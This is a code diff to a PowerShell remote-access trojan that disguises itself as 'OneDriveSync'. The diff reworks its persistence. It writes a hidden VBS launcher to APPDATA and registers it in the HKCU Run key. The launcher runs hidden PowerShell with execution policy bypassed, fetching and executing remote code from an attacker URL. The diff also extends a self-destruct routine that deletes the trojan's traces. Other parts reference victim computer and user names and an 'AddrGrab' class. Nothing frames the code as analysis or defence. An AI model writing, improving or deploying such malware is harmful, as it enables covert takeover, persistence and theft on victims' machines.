@@ -256,6 +256,7 @@ function Self-Destruct{
   try{
     Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
     Remove-Item (Join-Path $env:TEMP 'rat.ps1') -Force -EA 0
+    Remove-Item (Join-Path $env:APPDATA 'OneDriveSync.vbs') -Force -EA 0
     Remove-Item $HF -Force -EA 0
         Post '`[+] self destructed`'
     exit
@@ -830,11 +831,13 @@ public class AddrGrab {
 
 # ---- startup: persist + boot notify ----
 try{
-  $k=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
-  if(-not $k){
-    $v="powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('$RA')"
-    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -Value $v
-  }
+  $vbs=Join-Path $env:APPDATA 'OneDriveSync.vbs'
+  $vbsContent=@"
+Set s = CreateObject("Wscript.Shell")
+s.Run "powershell -NoP -WindowStyle Hidden -ExecutionPolicy Bypass -c IEX((New-Object Net.WebClient).DownloadString('$RA'))", 0, False
+"@
+  Set-Content -Path $vbs -Value $vbsContent -Force
+  Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -Value "wscript.exe `"$vbs`""
 }catch{}
 $VN=$env:COMPUTERNAME
 $VU=$env:USERNAME
